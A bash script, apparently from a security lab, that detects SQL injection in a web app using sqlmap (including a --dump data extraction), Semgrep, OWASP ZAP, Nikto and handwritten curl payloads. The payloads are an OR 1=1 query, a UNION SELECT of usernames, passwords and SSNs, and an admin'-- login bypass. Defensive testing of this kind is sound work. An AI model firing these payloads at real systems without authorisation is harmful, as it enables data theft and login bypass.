#!/usr/bin/env bash
set -euo pipefail

# SI-10 SQL Injection — Detect
#
# Detects SQL injection vulnerabilities using three methods:
#   1. SQLMap — automated SQL injection testing against live endpoints
#   2. Semgrep — SAST scan for SQL injection patterns in source code
#   3. OWASP ZAP — DAST active scan for injection and other web vulns
#
# REQUIREMENTS:
#   - sqlmap (https://sqlmap.org/)
#   - semgrep (https://semgrep.dev/)
#   - OWASP ZAP (https://www.zaproxy.org/) or zap-cli
#   - curl
#
# USAGE:
#   ./detect.sh <target_url> [source_dir]
#
# EXAMPLE:
#   ./detect.sh http://localhost:5000 /tmp/si10-sqli-evidence-*/vuln-app
#   ./detect.sh http://10.0.1.50:5000

# --- Argument Validation ---

if [[ $# -lt 1 ]]; then
    echo "Usage: $0 <target_url> [source_dir]"
    echo "Example: $0 http://localhost:5000 /path/to/app/source"
    echo ""
    echo "target_url:  Base URL of the application to test"
    echo "source_dir:  Path to application source code for SAST (optional)"
    exit 1
fi

TARGET="$1"
SOURCE_DIR="${2:-}"

EVIDENCE_DIR="/tmp/si10-sqli-detect-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "============================================"
echo "SI-10 SQL Injection — Detection"
echo "============================================"
echo ""
echo "[*] Target:       $TARGET"
echo "[*] Source dir:    ${SOURCE_DIR:-not provided}"
echo "[*] Evidence dir: $EVIDENCE_DIR"
echo ""

FINDINGS=0

# --- Method 1: SQLMap — Automated SQL Injection Testing ---

echo "[*] Method 1: SQLMap — automated SQL injection testing"
echo "----------------------------------------------"

if command -v sqlmap &>/dev/null; then
    # Test the /search endpoint
    echo "[*] Testing /search endpoint for SQL injection..."
    sqlmap -u "$TARGET/search?q=test" \
        --batch \
        --level=3 \
        --risk=2 \
        --technique=BEUSTQ \
        --threads=4 \
        --output-dir="$EVIDENCE_DIR/sqlmap-search" \
        --forms \
        --smart \
        2>&1 | tee "$EVIDENCE_DIR/sqlmap-search-output.txt" || true
    echo ""

    # Check for confirmed injection
    if grep -qi "is vulnerable\|injectable\|sql injection" "$EVIDENCE_DIR/sqlmap-search-output.txt" 2>/dev/null; then
        echo "[ALERT] SQLMap confirmed SQL injection in /search endpoint"
        FINDINGS=$((FINDINGS + 1))
    fi

    # Test the /login endpoint
    echo "[*] Testing /login endpoint for SQL injection..."
    sqlmap -u "$TARGET/login" \
        --data="username=admin&password=test" \
        --method=POST \
        --batch \
        --level=3 \
        --risk=2 \
        --technique=BEUSTQ \
        --threads=4 \
        --output-dir="$EVIDENCE_DIR/sqlmap-login" \
        2>&1 | tee "$EVIDENCE_DIR/sqlmap-login-output.txt" || true
    echo ""

    if grep -qi "is vulnerable\|injectable\|sql injection" "$EVIDENCE_DIR/sqlmap-login-output.txt" 2>/dev/null; then
        echo "[ALERT] SQLMap confirmed SQL injection in /login endpoint"
        FINDINGS=$((FINDINGS + 1))
    fi

    # Test the /user endpoint
    echo "[*] Testing /user/<id> endpoint for SQL injection..."
    sqlmap -u "$TARGET/user/1" \
        --batch \
        --level=3 \
        --risk=2 \
        --technique=BEUSTQ \
        --threads=4 \
        --output-dir="$EVIDENCE_DIR/sqlmap-user" \
        2>&1 | tee "$EVIDENCE_DIR/sqlmap-user-output.txt" || true
    echo ""

    if grep -qi "is vulnerable\|injectable\|sql injection" "$EVIDENCE_DIR/sqlmap-user-output.txt" 2>/dev/null; then
        echo "[ALERT] SQLMap confirmed SQL injection in /user/<id> endpoint"
        FINDINGS=$((FINDINGS + 1))
    fi

    # Attempt data dump to prove impact
    echo "[*] Attempting UNION-based data extraction to prove impact..."
    sqlmap -u "$TARGET/search?q=test" \
        --batch \
        --dump \
        --tables \
        --threads=4 \
        --output-dir="$EVIDENCE_DIR/sqlmap-dump" \
        2>&1 | tee "$EVIDENCE_DIR/sqlmap-dump-output.txt" || true

    if grep -qi "dumped\|entries\|Table:" "$EVIDENCE_DIR/sqlmap-dump-output.txt" 2>/dev/null; then
        echo "[ALERT] SQLMap extracted database contents — data exfiltration confirmed"
        FINDINGS=$((FINDINGS + 1))
    fi

    echo "[+] SQLMap results saved to $EVIDENCE_DIR/sqlmap-*"
else
    echo "[SKIP] sqlmap not installed."
    echo "       Install: apt-get install sqlmap"
    echo "       Or:      pip install sqlmap"
fi
echo ""

# --- Method 2: Semgrep — SAST Scan for SQL Injection Patterns ---

echo "[*] Method 2: Semgrep — static analysis for SQL injection patterns"
echo "----------------------------------------------"

if command -v semgrep &>/dev/null; then
    if [[ -n "$SOURCE_DIR" ]] && [[ -d "$SOURCE_DIR" ]]; then
        echo "[*] Running Semgrep with Python security rules..."
        semgrep --config "p/python" \
            --config "p/owasp-top-ten" \
            --config "p/sql-injection" \
            --json \
            --output "$EVIDENCE_DIR/semgrep-results.json" \
            "$SOURCE_DIR" 2>&1 | tee "$EVIDENCE_DIR/semgrep-output.txt" || true
        echo ""

        # Also run with specific SQL injection rules
        echo "[*] Running Semgrep with targeted SQL injection rules..."
        semgrep --config "r/python.lang.security.audit.formatted-sql-query" \
            --config "r/python.flask.security.injection.sql-injection" \
            --json \
            --output "$EVIDENCE_DIR/semgrep-sqli-results.json" \
            "$SOURCE_DIR" 2>&1 | tee "$EVIDENCE_DIR/semgrep-sqli-output.txt" || true

        # Count findings
        SEMGREP_COUNT=$(python3 -c "
import json, sys
try:
    with open('$EVIDENCE_DIR/semgrep-results.json') as f:
        data = json.load(f)
    print(len(data.get('results', [])))
except Exception:
    print('0')
" 2>/dev/null || echo "0")

        if [[ "$SEMGREP_COUNT" -gt 0 ]]; then
            echo "[ALERT] Semgrep found $SEMGREP_COUNT security finding(s) in source code"
            FINDINGS=$((FINDINGS + 1))
        else
            echo "[INFO] Semgrep returned 0 findings (check rule coverage)"
        fi

        echo "[+] Semgrep results saved to $EVIDENCE_DIR/semgrep-*.json"
    else
        echo "[SKIP] Source directory not provided or not found."
        echo "       Pass the source directory as the second argument:"
        echo "       ./detect.sh $TARGET /path/to/source"
    fi
else
    echo "[SKIP] semgrep not installed."
    echo "       Install: pip install semgrep"
    echo "       Or:      brew install semgrep"
fi
echo ""

# --- Method 3: OWASP ZAP — DAST Active Scan ---

echo "[*] Method 3: OWASP ZAP — DAST active scan"
echo "----------------------------------------------"

ZAP_AVAILABLE=false
if command -v zap-cli &>/dev/null; then
    ZAP_AVAILABLE=true
    ZAP_CMD="zap-cli"
elif command -v zap.sh &>/dev/null; then
    ZAP_AVAILABLE=true
    ZAP_CMD="zap.sh"
elif [[ -f /opt/zaproxy/zap.sh ]]; then
    ZAP_AVAILABLE=true
    ZAP_CMD="/opt/zaproxy/zap.sh"
fi

if [[ "$ZAP_AVAILABLE" == "true" ]]; then
    echo "[*] Running ZAP spider and active scan..."

    # Run ZAP in headless/daemon mode
    if command -v zap-cli &>/dev/null; then
        echo "[*] Starting ZAP daemon..."
        zap-cli start --start-options '-config api.disablekey=true' 2>/dev/null || true
        sleep 5

        echo "[*] Spidering target..."
        zap-cli spider "$TARGET" 2>&1 | tee "$EVIDENCE_DIR/zap-spider.txt" || true

        echo "[*] Running active scan..."
        zap-cli active-scan "$TARGET" 2>&1 | tee "$EVIDENCE_DIR/zap-active-scan.txt" || true

        echo "[*] Generating report..."
        zap-cli report -o "$EVIDENCE_DIR/zap-report.html" -f html 2>/dev/null || true
        zap-cli alerts 2>&1 | tee "$EVIDENCE_DIR/zap-alerts.txt" || true

        # Check for SQL injection alerts
        if grep -qi "sql injection\|SQL Injection" "$EVIDENCE_DIR/zap-alerts.txt" 2>/dev/null; then
            echo "[ALERT] ZAP detected SQL injection vulnerability"
            FINDINGS=$((FINDINGS + 1))
        fi

        zap-cli shutdown 2>/dev/null || true
    else
        echo "[*] ZAP found but zap-cli not available."
        echo "[*] Run manually:"
        echo "    $ZAP_CMD -cmd -quickurl $TARGET -quickout $EVIDENCE_DIR/zap-report.html"
    fi

    echo "[+] ZAP results saved to $EVIDENCE_DIR/zap-*"
else
    echo "[SKIP] OWASP ZAP not installed."
    echo "       Install: apt-get install zaproxy"
    echo "       Or:      snap install zaproxy --classic"
    echo "       Or:      docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t $TARGET"
fi
echo ""

# --- Method 4: Manual Curl Verification ---

echo "[*] Method 4: Manual curl — verify injection is exploitable"
echo "----------------------------------------------"

echo "[*] Testing classic SQL injection in /search..."
SQLI_TEST=$(curl -s "$TARGET/search?q=%27%20OR%201%3D1%20--" 2>/dev/null || echo "Connection failed")
echo "$SQLI_TEST" > "$EVIDENCE_DIR/manual-sqli-search.json"

if echo "$SQLI_TEST" | grep -qi "results\|count" 2>/dev/null; then
    RESULT_COUNT=$(echo "$SQLI_TEST" | python3 -c "import json,sys; print(json.load(sys.stdin).get('count', 0))" 2>/dev/null || echo "0")
    if [[ "$RESULT_COUNT" -gt 0 ]]; then
        echo "[ALERT] SQL injection confirmed — returned $RESULT_COUNT records with OR 1=1"
        FINDINGS=$((FINDINGS + 1))
    fi
fi

echo "[*] Testing UNION-based injection for data exfiltration..."
UNION_TEST=$(curl -s "$TARGET/search?q=%27%20UNION%20SELECT%201%2Cusername%2Cpassword%2Cssn%2Crole%20FROM%20users%20--" 2>/dev/null || echo "Connection failed")
echo "$UNION_TEST" > "$EVIDENCE_DIR/manual-union-injection.json"

if echo "$UNION_TEST" | grep -qi "admin\|password\|ssn\|123-45" 2>/dev/null; then
    echo "[ALERT] UNION injection confirmed — extracted usernames, passwords, and SSNs"
    FINDINGS=$((FINDINGS + 1))
fi

echo "[*] Testing authentication bypass in /login..."
AUTH_BYPASS=$(curl -s -X POST "$TARGET/login" -d "username=admin'--&password=anything" 2>/dev/null || echo "Connection failed")
echo "$AUTH_BYPASS" > "$EVIDENCE_DIR/manual-auth-bypass.json"

if echo "$AUTH_BYPASS" | grep -qi "authenticated" 2>/dev/null; then
    echo "[ALERT] Authentication bypass confirmed — logged in as admin without password"
    FINDINGS=$((FINDINGS + 1))
fi
echo ""

# --- Nikto Web Server Scan ---

echo "[*] Method 5: Nikto — web server vulnerability scan"
echo "----------------------------------------------"

if command -v nikto &>/dev/null; then
    echo "[*] Running Nikto scan..."
    nikto -h "$TARGET" -output "$EVIDENCE_DIR/nikto-output.txt" -Format txt \
        -Tuning 9 2>&1 | tee "$EVIDENCE_DIR/nikto-console.txt" || true

    if grep -qi "SQL injection\|injection" "$EVIDENCE_DIR/nikto-output.txt" 2>/dev/null; then
        echo "[ALERT] Nikto detected potential injection vulnerabilities"
        FINDINGS=$((FINDINGS + 1))
    fi

    echo "[+] Nikto results saved to $EVIDENCE_DIR/nikto-output.txt"
else
    echo "[SKIP] nikto not installed."
    echo "       Install: apt-get install nikto"
fi
echo ""

# --- Evidence Summary ---

echo "============================================"
echo "Detection Summary"
echo "============================================"
echo ""
echo "[*] Total findings: $FINDINGS"
echo ""

if [[ "$FINDINGS" -gt 0 ]]; then
    echo "[ALERT] SQL injection vulnerabilities detected!"
    echo ""
    echo "[*] Key risks:"
    echo "    - Data exfiltration: attacker can extract entire database (users, SSNs, passwords)"
    echo "    - Authentication bypass: attacker can log in as any user without credentials"
    echo "    - Data modification: attacker can INSERT, UPDATE, or DELETE records"
    echo "    - Remote code execution: on some DB engines, SQLi leads to OS command execution"
    echo "    - Compliance violation: PCI-DSS 6.5.1, OWASP Top 10 #3, NIST SI-10"
    echo ""
    echo "[*] Run fix.sh to patch to parameterized queries and add input validation."
else
    echo "[OK] No SQL injection vulnerabilities detected."
    echo "[*] This may mean the application is secure or the tools need different configuration."
fi

echo ""
echo "[*] Evidence saved to: $EVIDENCE_DIR"
echo "[*] Files:"
ls -la "$EVIDENCE_DIR/"
